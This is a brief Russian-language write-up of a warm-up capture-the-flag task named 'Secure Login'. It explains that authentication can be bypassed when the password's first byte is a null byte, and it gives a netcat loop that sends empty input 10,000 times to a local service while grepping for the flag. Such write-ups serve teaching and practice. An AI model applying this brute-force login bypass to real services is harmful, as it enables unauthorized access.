# Secure Login
Задачка на разминку. Авторизацию можно легко пройти, если повезёт и первый байт пароля будет `\x00`. 
Тогда достаточнно просто отправить пустую строку.

```sh
for i in `seq 1 10000`; do echo "" | nc 127.0.0.1 9999 | grep vsosh; done
```